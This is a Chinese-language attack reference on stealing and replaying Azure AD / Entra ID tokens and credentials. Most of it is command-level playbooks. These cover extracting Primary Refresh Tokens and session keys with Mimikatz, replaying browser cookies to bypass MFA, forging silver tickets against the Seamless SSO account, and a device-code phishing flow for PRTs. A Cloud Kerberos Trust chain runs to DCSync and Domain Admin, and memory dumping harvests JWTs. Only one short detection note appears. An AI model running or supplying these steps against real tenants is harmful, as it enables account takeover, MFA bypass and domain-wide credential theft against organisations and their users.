# 令牌与凭据类攻击详细技术参考

## Pass the PRT（Primary Refresh Token）

### PRT 概述

Primary Refresh Token（PRT）是 Azure AD 设备认证中的核心凭据，类似于 Kerberos TGT。PRT 在用户登录 Azure AD Joined 设备时签发，可用于请求几乎任何 Entra ID 集成资源的 Access Token。每个 PRT 附带一个 Session Key（Proof-of-Possession Key），用于签名请求证明持有者身份。

**存储位置**：PRT 和 Session Key 缓存在 LSASS 的 CloudAP 插件中。有 TPM 的设备将 Session Key 绑定到 TPM 硬件；无 TPM 设备以 DPAPI 加密方式存储在软件中。

**生命周期**：PRT 有效期约 14 天，活跃使用期间持续续期。

### 检测 PRT 是否存在

```powershell
dsregcmd /status
# 检查 AzureAdPrt 是否为 YES

# 检查 TPM 保护
Get-Tpm | Select TpmPresent,TpmReady,TpmEnabled,TpmOwned
# KeyProvider = Microsoft Platform Crypto Provider → TPM 绑定
# KeyProvider = Software Key Storage Provider → 非 TPM 绑定
```

### 无 TPM 设备：Mimikatz 直接提取

```powershell
# 步骤 1：从 LSASS 提取 PRT 和加密的 Session Key
privilege::debug
sekurlsa::cloudap
# 记录 Prt 字段（base64 编码的 PRT）和 ProofOfPossessionKey 中的 KeyValue

# 步骤 2：提升到 SYSTEM 解密 Session Key
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# 输出：Clear key（明文 Session Key）、Derived Key、Context

# 步骤 3：生成 PRT Cookie（JWT）
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
# 输出带 "Signature with key" 的签名 JWT
```

将生成的 JWT 设为浏览器 Cookie `x-ms-RefreshTokenCredential`，访问 `login.microsoftonline.com` 即可绕过 MFA 直接认证。

### 结合 AADInternals 使用

```powershell
# 从 Mimikatz 获取 PRT 和 Clear Key 后
$MimikatzPRT = "<base64_PRT>"
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))
$MimikatzKey = "<hex_clear_key>"
$SKey = [convert]::ToBase64String([byte[]]($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# 生成带 nonce 的 PRT Token
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey
# 获取 MS Graph API Access Token
Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
```

### 结合 roadtx 使用

```bash
# 续期 PRT
roadtx prt -a renew --prt <PRT> --prt-sessionkey <clear_key>
# 使用浏览器认证获取 Access Token（包含 MFA claim）
roadtx browserprtauth
roadtx describe < .roadtools_auth
```

### 有 TPM 设备：用户级别利用

TPM 保护阻止直接提取 PRT 和 Session Key，但可通过 Windows 内置认证 API 间接获取令牌。

**BrowserCore COM 接口**（用户级别无需管理员）：

```bash
# RequestAADRefreshToken：调用 BrowserCore COM 获取 PRT Cookie
RequestAADRefreshToken.exe --uri https://login.microsoftonline.com

# ROADtoken：自动化获取 PRT Cookie
# 1. 获取 nonce
roadrecon auth prt-init
# 2. 使用 ROADtoken 获取 PRT Cookie
.\ROADtoken.exe <nonce>
# 3. 使用 Cookie 生成令牌
roadrecon auth --prt-cookie <prt_cookie>
```

**WAM API**（用户级别）：

```powershell
# 通过 MSAL 静默获取 Access Token
$app = [Microsoft.Identity.Client.PublicClientApplicationBuilder]::Create("client-id").Build()
$result = $app.AcquireTokenSilent(@("https://graph.microsoft.com/.default"), $app.GetAccountsAsync().Result[0]).ExecuteAsync().Result
$result.AccessToken
```

**管理员/SYSTEM 级别**：模拟目标用户进程（如 `explorer.exe`），然后调用上述任意 API 获取该用户的令牌。

### PRT 钓鱼（Phishing PRTs）

利用 OAuth Device Code 流程配合 Microsoft Authentication Broker 客户端 ID（`29d9ed98-a469-4536-ade2-f981bc1d605e`）获取可升级为 PRT 的 Refresh Token：

```bash
# 1. 发起 Device Code 认证
curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
  -d "scope=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default offline_access openid profile"
# 2. 受害者完成登录和 MFA
# 3. 使用获取的 Refresh Token 注册恶意设备
# 4. 将 Refresh Token 升级为 PRT
# 5. （可选）注册 Windows Hello for Business 密钥实现持久化
```

**工具**：ROADtools/ROADtx、DeviceCode2WinHello

---

## Pass the Certificate

### 原理

在支持 NegoEx 认证的 Azure AD Joined 机器之间，可使用 Entra ID CA 签发的 P2P 证书进行跨机器认证。攻击者利用已提取的 PRT 信息向 Entra ID 请求目标用户的证书，然后使用该证书远程访问其他机器。

### 前置条件

需要完整的 Pass the PRT 攻击所需信息：
- Username、Tenant ID、PRT、Security Context、Derived Key

### 攻击步骤

```bash
# 1. 使用 PrtToCert 请求 P2P 证书
RequestCert.py --tenantId <TenantID> --prt <PRT> --userName <Username> \
  --hexCtx <SecurityContext> --hexDerivedKey <DerivedKey> [--passPhrase <passphrase>]
# 证书有效期与 PRT 相同

# 2. 使用 AzureADJoinedMachinePTC 通过证书远程访问目标机器
Main.py --usercert <user_cert.pfx> --certpass <certpass> --remoteip <target_ip>
# 在目标机器上获得 CMD（通过 PSEXEC），可继续提取下一个用户的 PRT
```

---

## Pass the Cookie

### 原理

Azure 认证 Cookie 存储在浏览器中，代表已完成认证（包括 MFA）的会话。提取并重放这些 Cookie 可绕过所有认证要求直接访问 Azure 资源。

### 关键 Cookie

| Cookie 名称 | 作用 | 生成条件 |
|-------------|------|---------|
| `ESTSAUTH` | 标准认证会话 Cookie | 用户登录 Azure AD |
| `ESTSAUTHPERSISTENT` | 持久认证 Cookie | 用户勾选"保持登录" |
| `ESTSAUTHLIGHT` | 轻量认证 Cookie | 部分认证场景 |

### 攻击步骤

```powershell
# 1. 使用 Mimikatz 解密 Chrome Cookie（需要用户的 DPAPI Master Key）
mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

# 2. 在攻击者浏览器中：
#    - 访问 login.microsoftonline.com
#    - 设置 Cookie：ESTSAUTHPERSISTENT = <stolen_value>
#    - 刷新页面 → 直接以受害者身份登录
```

---

## Seamless SSO

### 原理

Seamless SSO 在本地 AD 中创建 `AZUREADSSOACC$` 计算机账户，其密码以明文发送给 Entra ID。域内机器的浏览器自动将 Kerberos 票据发送到 `https://autologon.microsoftazuread-sso.com` 实现无缝登录。**该账户密码永不更换**。

### 攻击方式一：SeamlessPass 一键利用

```bash
# 使用受害者的 TGT
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_TGT>
# 使用受害者的 TGS
seamlesspass -tenant corp.com -tgs user_tgs.ccache
# 使用受害者的密码/哈希
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm <hash>
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -password <password>
# 使用 AZUREADSSOACC$ 哈希冒充任意用户
seamlesspass -tenant corp.com -adssoacc-ntlm <hash> -user-sid <user_SID>
seamlesspass -tenant corp.com -adssoacc-aes <aes_key> -domain-sid <domain_SID> -user-rid <RID>
```

### 攻击方式二：银票伪造

```powershell
# 1. 提取 AZUREADSSOACC$ 哈希
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'

# 2. 获取目标用户的 SID
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# 3. 伪造银票
Invoke-Mimikatz -Command '"kerberos::golden /user:<target_user> /sid:<domain_SID> /id:<user_RID> /domain:domain.local /rc4:<azureadssoacc_hash> /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt"'
```

### 攻击方式三：RBCD（Resource Based Constrained Delegation）

当拥有对 `AZUREADSSOACC$` 的 `WriteDACL`/`GenericWrite` 权限时：

```bash
# 1. 创建受控机器账户
python3 addcomputer.py DOMAIN/user:'Password'@<DC_IP> -computer ATTACKBOX$ -password S3cureP@ss

# 2. 配置 RBCD
python3 rbcd.py DOMAIN/user:'Password'@<DC_IP> ATTACKBOX$ AZUREADSSOACC$

# 3. 为任意用户伪造 TGS
python3 getST.py -dc-ip <DC_IP> -spn HTTP/autologon.microsoftazuread-sso.com \
  -impersonate <target_user> DOMAIN/ATTACKBOX$ -hashes :<machine_hash>
```

### 使用银票配合浏览器

Firefox 配置：`about:config` 中设置 `network.negotiate-auth.trusted-uris` 为 `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`，启用 Windows SSO 后访问 `login.microsoftonline.com`，输入用户名后按 TAB/Enter 即自动认证。

**注意**：银票不绕过 MFA。

---

## Cloud Kerberos Trust

### 原理

Cloud Kerberos Trust 在 AD 中创建 `AzureADKerberos$` RODC 账户和 `krbtgt_AzureAD` 账户。Entra ID 持有这些账户的密钥，可为 AD 用户签发 Partial TGT。默认情况下，Domain Admins 等高权限组在 RODC deny 策略中被阻止。

### 完整攻击链（Cloud→AD Domain Admin）

**前置条件**：
- Cloud Kerberos Trust 已启用
- Global Admin 或 Hybrid Identity Admin 权限
- 至少一个混合用户账户
- 目标 AD 账户不在 RODC deny 策略中（如 MSOL 同步账户）

```bash
# 1. 获取 Sync API 访问令牌
roadtx gettokens -u <GA_UPN> -p <Password> --resource aadgraph

# 2. 修改混合用户的 onPremisesSID 和 SAMAccountName 指向目标
python3 modifyuser.py -u <GA_UPN> -p <Password> \
  --sourceanchor <ImmutableID_of_HybridUser> \
  --sid <Target_AD_SID> --sam <Target_SAM>
# Azure AD Graph 正常不允许修改这些属性，但 Sync API 允许 GA 调用

# 3. 获取包含 Partial TGT 的 PRT
roadtx getprt -u <HybridUser_UPN> -p <Password> -d <DeviceID_or_Cert>
# 输出 .prt 文件包含 Partial TGT 和 Session Key

# 4. 在 DC 上将 Partial TGT 换为 Full TGT
python3 partialtofulltgt.py -p roadtx.prt -o full_tgt.ccache --extract-hash
# 使用 KERB-KEY-LIST-REQ 扩展提取目标账户的 NTLM 哈希

# 5. 使用目标账户（如 MSOL 同步账户）执行 DCSync
secretsdump.py 'DOMAIN/<TargetSAM>$@<DC_IP>' -hashes :<NTLM_hash>
# 获取全域哈希，包括 KRBTGT → Domain Admin
```

**清理**：下次 Azure AD Connect 同步周期会自动还原被修改的属性。但攻击者此时已完成 DCSync，拥有全域控制权。

---

## Exchange Hybrid 模拟（ACS Actor Tokens）

### 原理

旧版 Exchange Hybrid 设计中，本地 Exchange 与 Exchange Online 共享同一 Entra 应用身份。攻击者从本地 Exchange 服务器提取 Hybrid 证书私钥后，可通过 OAuth client-credentials 流程获取 First-party Token。

### 攻击路径

- **Federation 配置篡改**：Exchange Token 历史上有权限修改域/联合设置，包括 Token Signing 证书列表
- **ACS Actor Token 模拟**：使用 `trustedfordelegation=true` 的 Actor Token 嵌入目标用户身份，实现对 Exchange Online 和 SharePoint/OneDrive 的用户模拟（约 24 小时有效）

### 当前状态

- `graph.windows.net` 的模拟路径已被修补
- Exchange/SharePoint 模拟在未完成服务身份分离迁移的环境中仍有效
- 微软的长期缓解方案是分离本地和 Exchange Online 的 SP 身份

### 检测信号

审计事件中出现身份不匹配：UPN 对应被模拟用户，但显示名/来源上下文指向 Exchange Online 活动。

---

## 本地云凭据提取

### Azure CLI 凭据

```bash
# Access Token（明文 JSON）
type C:\Users\<user>\.Azure\accessTokens.json
# 订阅信息
type C:\Users\<user>\.Azure\azureProfile.json
# 错误日志中可能包含嵌入的凭据
dir C:\Users\<user>\.Azure\ErrorRecords\
```

### Azure PowerShell 凭据

```bash
# Token 缓存
C:\Users\<user>\.Azure\TokenCache.dat
# Service Principal Secret（明文）
type C:\Users\<user>\.Azure\AzureRmContext.json
```

### 进程内存中的 JWT Token

同步云端的 Microsoft 应用（Excel、Teams 等）可能在内存中以明文存储 Access Token：

```bash
# 1. 转储目标进程内存
procdump64.exe -ma <PID> excel.dmp
# 2. 搜索 JWT Token
strings excel.dmp | grep 'eyJ0'
# 3. 验证 Token
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq
# 4. 访问邮件
curl -s -H "Authorization: Bearer <token>" https://outlook.office.com/api/v2.0/me/messages | jq
```

### 自动化工具

- **WinPEAS**：自动搜索上述所有凭据位置
- **Get-AzurePasswords.ps1**（MicroBurst）：专项 Azure 凭据收集
